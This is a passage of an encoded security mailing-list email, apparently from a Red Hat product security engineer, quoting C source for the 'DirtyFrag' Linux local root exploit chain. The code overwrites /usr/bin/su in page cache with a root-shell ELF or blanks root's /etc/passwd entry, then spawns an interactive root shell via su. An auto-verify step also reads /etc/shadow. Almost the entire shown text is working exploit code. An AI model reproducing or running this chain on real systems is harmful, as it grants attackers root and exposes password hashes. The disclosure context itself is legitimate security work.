>                         int wstatus =3D 0;
>                         waitpid(pid, &wstatus, 0);
>                         if (r > 0) {
>                                 buf[r] =3D 0;
>                                 fprintf(stderr, "[getent passwd root] %s",
> buf);
>                         }
>                         fprintf(stderr,
>                                         "[+] PRIMITIVE proven: root entry
> has empty passwd field "
>                                         "via NSS.\n");
>                 }
>         }
>
>         /* Honour `--corrupt-only` arg or DIRTYFRAG_CORRUPT_ONLY=3D1 env =
so
>          * the chain wrapper can skip the in-process su PTY stage and exec
>          * /usr/bin/su itself.  Avoids the flaky posix_openpt bridge. */
>         {
>                 int co_flag =3D 0;
>                 for (int i =3D 1; i < argc; i++)
>                         if (!strcmp(argv[i], "--corrupt-only")) { co_flag
> =3D 1; break; }
>                 const char *e =3D getenv("DIRTYFRAG_CORRUPT_ONLY");
>                 if (e && *e =3D=3D '1') co_flag =3D 1;
>                 if (co_flag) return 0;
>         }
>
>         /* =3D=3D=3D STAGE 4 =E2=80=94 `su` (target=3Droot, no password i=
nput) =3D=3D=3D
>          * PAM common-auth contains "auth [success=3D2 default=3Dignore]
>          * pam_unix.so nullok" =E2=80=94 so a target user with empty pass=
wd field
>          * + nullok flag accepts an empty password.  We auto-inject a
>          * single newline on the "Password:" prompt and then bridge the
>          * resulting bash to the user's tty. */
>         fprintf(stderr,
>                         "\n=3D=3D=3D STAGE 4: spawning interactive root s=
hell
> via `su` "
>                         "(no password input needed) =3D=3D=3D\n\n");
>         fflush(stderr);
>
>         int master =3D posix_openpt(O_RDWR | O_NOCTTY);
>         if (master < 0 || grantpt(master) < 0 || unlockpt(master) < 0) {
>                 WARN("posix_openpt: %s", strerror(errno));
>                 return 5;
>         }
>         char *slave_name =3D ptsname(master);
>
>         struct winsize ws;
>         if (ioctl(STDIN_FILENO, TIOCGWINSZ, &ws) =3D=3D 0) {
>                 ioctl(master, TIOCSWINSZ, &ws);
>         }
>
>         pid_t pid =3D fork();
>         if (pid < 0) { WARN("fork: %s", strerror(errno)); return 5; }
>         if (pid =3D=3D 0) {
>                 /* child */
>                 setsid();
>                 int slave =3D open(slave_name, O_RDWR);
>                 if (slave < 0) _exit(127);
>                 ioctl(slave, TIOCSCTTY, 0);
>                 dup2(slave, 0); dup2(slave, 1); dup2(slave, 2);
>                 if (slave > 2) close(slave);
>                 close(master);
>                 /* `su` with no args targets root.  PAM common-auth's
> pam_unix.so
>                  * nullok accepts the empty passwd we planted in
> /etc/passwd. */
>                 execlp("su", "su", NULL);
>                 _exit(127);
>         }
>
>         /* parent: bridge user's tty <-> master. */
>         struct termios saved_termios;
>         int saved_termios_ok =3D (tcgetattr(STDIN_FILENO, &saved_termios)=
 =3D=3D
> 0);
>         if (saved_termios_ok) {
>                 struct termios raw =3D saved_termios;
>                 cfmakeraw(&raw);
>                 tcsetattr(STDIN_FILENO, TCSANOW, &raw);
>         }
>
>         int auto_pw_sent =3D 0;
>         int stdin_eof =3D 0;          /* set when stdin closes (e.g.
> /dev/null) */
>         char buf[4096];
>         /* If LPE_AUTO_VERIFY=3D1 is set, the bridge will inject
>          * `id; whoami; exit\n` so it can prove uid=3D0 non-interactively
>          * (e.g. when stdin is /dev/null in CI). */
>         int auto_verify =3D 0;
>         {
>                 const char *e =3D getenv("LPE_AUTO_VERIFY");
>                 if (e && *e =3D=3D '1') auto_verify =3D 1;
>         }
>         int verify_sent =3D 0;
>         int total_ms =3D 0;
>         for (;;) {
>                 struct pollfd pfds[2] =3D {
>                         { stdin_eof ? -1 : STDIN_FILENO, POLLIN, 0 },
>                         { master,       POLLIN, 0 },
>                 };
>                 int pr =3D poll(pfds, 2, 200);
>                 if (pr < 0 && errno !=3D EINTR) break;
>                 total_ms +=3D 200;
>
>                 if (pfds[1].revents & POLLIN) {
>                         ssize_t n =3D read(master, buf, sizeof(buf));
>                         if (n <=3D 0) break;
>                         (void)write(STDOUT_FILENO, buf, n);
>                         if (!auto_pw_sent && (size_t)n < sizeof(buf)) {
>                                 buf[n] =3D 0;
>                                 if (strstr(buf, "Password") || strstr(buf,
> "password")) {
>                                         /* Empty password =E2=80=94 PAM n=
ullok
> will accept it.
>                                          * (When pam_unix sees an empty
> passwd field plus
>                                          * nullok it skips the prompt
> entirely; this branch
>                                          * handles the case where some
> other PAM module
>                                          * prints a prompt anyway.) */
>                                         (void)write(master, "\n", 1);
>                                         auto_pw_sent =3D 1;
>                                 }
>                         }
>                 }
>                 if (!stdin_eof && (pfds[0].revents & POLLIN)) {
>                         ssize_t n =3D read(STDIN_FILENO, buf, sizeof(buf)=
);
>                         if (n <=3D 0) {
>                                 /* stdin EOF =E2=80=94 stop reading from =
it but
> keep bridging
>                                  * master =E2=86=92 stdout so su can stil=
l finish
> auth and run
>                                  * the optional auto-verify command. */
>                                 stdin_eof =3D 1;
>                         } else {
>                                 (void)write(master, buf, n);
>                         }
>                 }
>                 if (pfds[1].revents & (POLLHUP | POLLERR)) break;
>
>                 /* Auto-verify: ~1 s after spawn, send `id; whoami;
> exit\n` so
>                  * the bridge captures uid=3D0 evidence non-interactively
> even
>                  * when pam_unix's blank-passwd path skips the prompt. */
>                 if (auto_verify && !verify_sent && total_ms >=3D 1000) {
>                         const char cmd[] =3D "id; whoami; cat /etc/shadow=
 |
> head -2; exit\n";
>                         (void)write(master, cmd, sizeof(cmd) - 1);
>                         verify_sent =3D 1;
>                 }
>
>                 int status;
>                 pid_t w =3D waitpid(pid, &status, WNOHANG);
>                 if (w =3D=3D pid) {
>                         for (int i =3D 0; i < 5; i++) {
>                                 struct pollfd pf =3D { master, POLLIN, 0 =
};
>                                 if (poll(&pf, 1, 50) <=3D 0) break;
>                                 ssize_t n =3D read(master, buf, sizeof(bu=
f));
>                                 if (n <=3D 0) break;
>                                 (void)write(STDOUT_FILENO, buf, n);
>                         }
>                         break;
>                 }
>         }
>         if (saved_termios_ok) {
>                 tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios);
>         }
>         close(master);
>         return 0;
> }
> /*
>  * DirtyFrag chain =E2=80=94 uid=3D1000 =E2=86=92 root.
>  *
>  * 1. ESP path  (authencesn AF_ALG --corrupt-only): overwrites the first
>  *    160 bytes of /usr/bin/su's page-cache with a static x86_64 root-
>  *    shell ELF.  Works on every distro tested regardless of PAM nullok
>  *    or /etc/passwd contents =E2=80=94 once invoked, the patched setuid-=
root
>  *    /usr/bin/su just execs /bin/sh as uid 0.
>  *
>  * 2. rxrpc path  (Ubuntu fallback): if AF_ALG is sandboxed and the ESP
>  *    path can't reach the page cache, fall back to the rxrpc/rxkad
>  *    nullok primitive that patches /etc/passwd's root entry empty.
>  *    PAM nullok then accepts the empty password during `su -`.
>  *
>  * 3. Once either target is corrupted, spawn `/usr/bin/su -` inside a
>  *    fresh PTY and bridge the user's tty to it.  The bridge handles
>  *    both the patched-su (no PAM at all) and the patched-passwd (PAM
>  *    nullok) cases uniformly, and works even when the caller is in a
>  *    background process group of an ssh-allocated PTY.
>  *
>  */
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <errno.h>
> #include <fcntl.h>
> #include <sched.h>
> #include <poll.h>
> #include <signal.h>
> #include <termios.h>
> #include <sys/ioctl.h>
> #include <sys/wait.h>
> #include <sys/types.h>
> #include <stdint.h>
>
> extern int su_lpe_main(int argc, char **argv);
> extern int rxrpc_lpe_main(int argc, char **argv);
>
> /*
>  * The 8 bytes our su payload places at file offset 0x78 =E2=80=94 the fi=
rst
>  * instructions of the embedded shell ELF.  Sequence:
>  *   31 ff   xor edi, edi
>  *   31 f6   xor esi, esi
>  *   31 c0   xor eax, eax
>  *   b0 6a   mov al, 0x6a   (setgid)
>  * Distros' original /usr/bin/su has different bytes here, so this is
>  * a reliable post-patch marker.
>  *
>  * (We don't check offset 0 because /usr/bin/su already has the ELF
>  * magic there =E2=80=94 both before and after we patch.)
>  */
> static const uint8_t su_marker[8] =3D {
>         0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
> };
>
> static int su_already_patched(void)
> {
>         int fd =3D open("/usr/bin/su", O_RDONLY);
>         if (fd < 0)
>                 return 0;
>         uint8_t got[8];
>         ssize_t n =3D pread(fd, got, sizeof(got), 0x78);
>         close(fd);
>         if (n !=3D sizeof(got))
>                 return 0;
>         return memcmp(got, su_marker, sizeof(su_marker)) =3D=3D 0;
> }
>
> static int passwd_already_patched(void)
> {
>         int fd =3D open("/etc/passwd", O_RDONLY);
>         if (fd < 0)
>                 return 0;
>         char head[16];
>         ssize_t n =3D pread(fd, head, sizeof(head), 0);
>         close(fd);
>         if (n < 9)
>                 return 0;
>         return memcmp(head, "root::0:0", 9) =3D=3D 0;
> }
>
> static int either_target_patched(void)
> {
>         return su_already_patched() || passwd_already_patched();
> }
>
> static void silence_stderr(int *saved_fd)
> {
>         *saved_fd =3D dup(STDERR_FILENO);
>         int dn =3D open("/dev/null", O_WRONLY);
>         if (dn >=3D 0) {
>                 dup2(dn, STDERR_FILENO);
>                 close(dn);
>         }
> }
>
> static void restore_stderr(int saved_fd)
> {
>         if (saved_fd >=3D 0) {
>                 dup2(saved_fd, STDERR_FILENO);
>                 close(saved_fd);
>         }
> }
>
> static char **append_corrupt_only(int argc, char **argv, int *new_argc)
> {
>         static char *flag =3D "--corrupt-only";
>         static char *buf[64];
>         int n =3D argc < 60 ? argc : 60;
>         for (int i =3D 0; i < n; i++)
>                 buf[i] =3D argv[i];
>         buf[n] =3D flag;
>         buf[n + 1] =3D NULL;
>         *new_argc =3D n + 1;
>         return buf;
> }
>
> static void exec_su_login(void)
> {
>         const char *paths[] =3D {
>                 "/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su", NUL=
L,
>         };
>         for (int i =3D 0; paths[i]; i++)
>                 execl(paths[i], "su", "-", (char *)NULL);
>         execlp("su", "su", "-", (char *)NULL);
> }
>
> /*
>  * Spawn `/usr/bin/su -` in a fresh PTY and bridge our tty to it.
>  */
> static int run_root_pty(void)
> {
>         int master =3D posix_openpt(O_RDWR | O_NOCTTY);
>         if (master < 0)
>                 return -1;
>         if (grantpt(master) < 0 || unlockpt(master) < 0) {
>                 close(master);
>                 return -1;
>         }
>         char *slave_name =3D ptsname(master);
>         if (!slave_name) {
>                 close(master);
>                 return -1;
>         }
>
>         struct winsize ws;
>         if (ioctl(STDIN_FILENO, TIOCGWINSZ, &ws) =3D=3D 0)
>                 ioctl(master, TIOCSWINSZ, &ws);
>
>         pid_t pid =3D fork();
>         if (pid < 0) {
>                 close(master);
>                 return -1;
>         }
>         if (pid =3D=3D 0) {
>                 setsid();
>                 int slave =3D open(slave_name, O_RDWR);
>                 if (slave < 0)
>                         _exit(127);
>                 ioctl(slave, TIOCSCTTY, 0);
>                 dup2(slave, 0);
>                 dup2(slave, 1);
>                 dup2(slave, 2);
>                 if (slave > 2)
>                         close(slave);
>                 close(master);
>                 exec_su_login();
>                 _exit(127);
>         }
>
>         signal(SIGTTOU, SIG_IGN);
>         signal(SIGTTIN, SIG_IGN);
>         signal(SIGPIPE, SIG_IGN);
>         signal(SIGHUP,  SIG_IGN);
>         (void)setpgid(0, 0);
>         (void)tcsetpgrp(STDIN_FILENO, getpid());
>
>         struct termios saved_termios;
>         int restore_termios =3D 0;
>         if (tcgetattr(STDIN_FILENO, &saved_termios) =3D=3D 0) {
>                 struct termios raw =3D saved_termios;
>                 cfmakeraw(&raw);
>                 if (tcsetattr(STDIN_FILENO, TCSANOW, &raw) =3D=3D 0)
>                         restore_termios =3D 1;
>         }
>
>         int auto_pw_sent =3D 0;
>         int stdin_eof =3D 0;
>         int saw_master_output =3D 0;
>         int total_ms =3D 0;
>         char buf[4096];
>
>         for (;;) {
>                 struct pollfd pfds[2] =3D {
>                         { stdin_eof ? -1 : STDIN_FILENO, POLLIN, 0 },
>                         { master,                        POLLIN, 0 },
>                 };
>                 int pr =3D poll(pfds, 2, 200);
>                 if (pr < 0 && errno !=3D EINTR)
>                         break;
>                 total_ms +=3D 200;
>
>                 if (pfds[1].revents & POLLIN) {
>                         ssize_t n =3D read(master, buf, sizeof(buf));
>                         if (n <=3D 0)
>                                 break;
>                         saw_master_output =3D 1;
>                         (void)write(STDOUT_FILENO, buf, n);
>                         if (!auto_pw_sent && n < (ssize_t)sizeof(buf)) {
>                                 buf[n] =3D 0;
>                                 if (strstr(buf, "Password") ||
>                                                 strstr(buf, "password")) {
>                                         (void)write(master, "\n", 1);
>                                         auto_pw_sent =3D 1;
>                                 }
>                         }
>                 }
>                 if (!stdin_eof && (pfds[0].revents & POLLIN)) {
>                         ssize_t n =3D read(STDIN_FILENO, buf, sizeof(buf)=
);
>                         if (n <=3D 0)
>                                 stdin_eof =3D 1;
>                         else
>                                 (void)write(master, buf, n);
>                 }
>                 if (pfds[1].revents & (POLLHUP | POLLERR))
>                         break;
>
>                 if (!auto_pw_sent && !saw_master_output && total_ms >=3D
> 1500) {
>                         (void)write(master, "\n", 1);
>                         auto_pw_sent =3D 1;
>                 }
>
>                 int status;
>                 pid_t w =3D waitpid(pid, &status, WNOHANG);
>                 if (w =3D=3D pid) {
>                         for (int i =3D 0; i < 5; i++) {
>                                 struct pollfd pf =3D { master, POLLIN, 0 =
};
>                                 if (poll(&pf, 1, 50) <=3D 0)
>                                         break;
>                                 ssize_t n =3D read(master, buf, sizeof(bu=
f));
>                                 if (n <=3D 0)
>                                         break;
>                                 (void)write(STDOUT_FILENO, buf, n);
>                         }
>                         break;
>                 }
>         }
>
>         if (restore_termios)
>                 tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios);
>         close(master);
>         return 0;
> }
>
> int main(int argc, char **argv)
> {
>         int verbose =3D (getenv("DIRTYFRAG_VERBOSE") !=3D NULL);
>         int force_esp =3D 0, force_rxrpc =3D 0;
>         int saved_err =3D -1;
>         int rc =3D 1;
>         int new_argc;
>         char **co_argv;
>
>         for (int i =3D 1; i < argc; i++) {
>                 if (!strcmp(argv[i], "--force-esp"))
>                         force_esp =3D 1;
>                 else if (!strcmp(argv[i], "--force-rxrpc"))
>                         force_rxrpc =3D 1;
>                 else if (!strcmp(argv[i], "-v") ||
>                                 !strcmp(argv[i], "--verbose"))
>                         verbose =3D 1;
>         }
>
>         if (getuid() =3D=3D 0) {
>                 execlp("/bin/bash", "bash", (char *)NULL);
>                 _exit(1);
>         }
>
>         co_argv =3D append_corrupt_only(argc, argv, &new_argc);
>
>         if (!verbose)
>                 silence_stderr(&saved_err);
>
>         if (force_rxrpc) {
>                 rc =3D rxrpc_lpe_main(new_argc, co_argv);
>                 for (int i =3D 0; !passwd_already_patched() && i < 3; i++)
>                         rc =3D rxrpc_lpe_main(new_argc, co_argv);
>         } else if (force_esp) {
>                 rc =3D su_lpe_main(new_argc, co_argv);
>         } else {
>                 rc =3D su_lpe_main(new_argc, co_argv);
>                 if (!su_already_patched()) {
>                         rc =3D rxrpc_lpe_main(new_argc, co_argv);
>                         for (int i =3D 0; !passwd_already_patched() && i <
> 3; i++)
>                                 rc =3D rxrpc_lpe_main(new_argc, co_argv);
>                 }
>         }
>
>         int patched =3D either_target_patched();
>
>         if (!verbose)
>                 restore_stderr(saved_err);
>
>         if (patched) {
>                 (void)run_root_pty();
>                 return 0;
>         }
>
>         dprintf(2, "dirtyfrag: failed (rc=3D%d)\n", rc);
>         return rc ? rc : 1;
> }
> ```
>
>

--=20
*Sandipan Roy*

Senior Product Security Engineer, Product Security

Secure Engineering - Incident Response

Email: sandipan@redhat.com

PGP:0x4B5C7470051BB332 <https://bytehackr.fedorapeople.org/saroy.asc>

*secalert@redhat.com <secalert@redhat.com>* For Urgent Response.
<https://www.redhat.com/>

--000000000000db298706513f15aa--

